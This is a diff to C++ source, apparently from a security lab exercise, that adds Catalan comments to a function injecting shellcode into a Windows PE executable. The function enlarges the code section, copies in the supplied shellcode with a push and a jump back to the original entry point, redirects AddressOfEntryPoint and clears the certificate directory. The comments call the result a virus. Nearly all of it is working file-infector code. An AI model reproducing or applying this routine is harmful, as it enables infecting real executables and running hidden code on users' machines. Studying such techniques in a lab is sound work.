@@ -122,8 +122,10 @@ namespace PE
 
 	void Inject_Resize_Code(char* pe_file, size_t size_of_pe, char xcode[], size_t size_of_xcode, const std::string& out_path)
 	{
+		// Llegeix el fitxer PE amb la funcio ParsePE del lab
 		auto Parsed_PE = ParsePE(pe_file);
 
+		// Llegim el tipus de fitxer que es.
 		if (Parsed_PE.ids.e_magic != IMAGE_DOS_SIGNATURE)
 		{
 			std::cout << "Sorry, I have no idea how to deal with this kind of files :/\n";
@@ -147,6 +149,7 @@ namespace PE
 			}
 		}
 
+		// Passes necessaries per calcular AddressOfEntryPoint del PE actual amb image base i @ of entry point. I amb aquesta informació i hexcode de push i de jmp esp el guardem a hex_oep i guardem la nova mida.
 		auto imagebase = Parsed_PE.inh32.OptionalHeader.ImageBase;
 		auto OEP = Parsed_PE.inh32.OptionalHeader.AddressOfEntryPoint;
 		auto image_base_OEP = imagebase + OEP;
@@ -155,6 +158,7 @@ namespace PE
 		char hex_oep[] = { image_base_OEP >> 0 & 0xFF, image_base_OEP >> 8 & 0xFF, image_base_OEP >> 16 & 0xFF, image_base_OEP >> 24 & 0xFF }; // OEP
 		auto inj_size = sizeof push + sizeof esp + sizeof hex_oep + size_of_xcode - 4;
 
+		// Canviem el el tamany de RawData i l'alinem
 		auto Last_of_Original_Raw_Address = Parsed_PE.ish[code_section].SizeOfRawData;
 		auto aligned_size_of_xcode = align_up(inj_size, Parsed_PE.inh32.OptionalHeader.FileAlignment);
 		Parsed_PE.ish[code_section].SizeOfRawData += aligned_size_of_xcode; // resize size of code section
@@ -171,6 +175,7 @@ namespace PE
 		auto section_ = code_section;
 		auto index_ = Last_of_Original_Raw_Address;
 
+		// Nou AOEP i mida del virus complet
 		auto AEP = index_ + Parsed_PE.ish[section_].VirtualAddress;
 		Parsed_PE.inh32.OptionalHeader.AddressOfEntryPoint = AEP;
 
@@ -178,7 +183,7 @@ namespace PE
 		shared_ptr<char> n_section(new char[size_of_code_section + aligned_size_of_xcode]{}, std::default_delete<char[]>());
 		memcpy(n_section.get(), Parsed_PE.Sections[section_].get(), size_of_code_section);
 
-
+		// Memcpy per posar el shellcode, push, jump i afegir-ho
 		auto inj_section = n_section.get();
 		memcpy(&inj_section[index_], xcode, size_of_xcode - 1);
 		memcpy(&inj_section[index_ + size_of_xcode - 1], push, sizeof push);
@@ -200,15 +205,17 @@ namespace PE
 		Parsed_PE.inh32.OptionalHeader.DataDirectory[4].VirtualAddress = { 0 };
 		Parsed_PE.inh32.OptionalHeader.DataDirectory[4].Size = { 0 };
 
-		// If v_sz != 0 and v_sz < r_sz, increase v_sz by sizeof(xcode).
+		// If Code Section VirtualSize < SizeOfRawData increase it a little bit over the size of the complete virus.
 		if (Parsed_PE.ish[code_section].SizeOfRawData > Parsed_PE.ish[code_section].Misc.VirtualSize && Parsed_PE.ish[code_section].Misc.VirtualSize != 0) {
 			Parsed_PE.ish[code_section].Misc.VirtualSize += inj_size + 0x17;  // just enough
 			auto last_section = Parsed_PE.inh32.FileHeader.NumberOfSections - 1;
 			Parsed_PE.inh32.OptionalHeader.SizeOfImage = Parsed_PE.ish[last_section].VirtualAddress + align_up((Parsed_PE.ish[last_section].Misc.VirtualSize) ? Parsed_PE.ish[last_section].Misc.VirtualSize : Parsed_PE.ish[last_section].SizeOfRawData, Parsed_PE.inh32.OptionalHeader.SectionAlignment);
 		}
 
+		// Actualitzem la mida de la imatge
 		auto size_of_changed_pe = size_of_pe + aligned_size_of_xcode;
 
+		// Escriu el binary amb la funcio writebinary
 		WriteBinary(Parsed_PE, out_path, size_of_changed_pe);
 
 	}
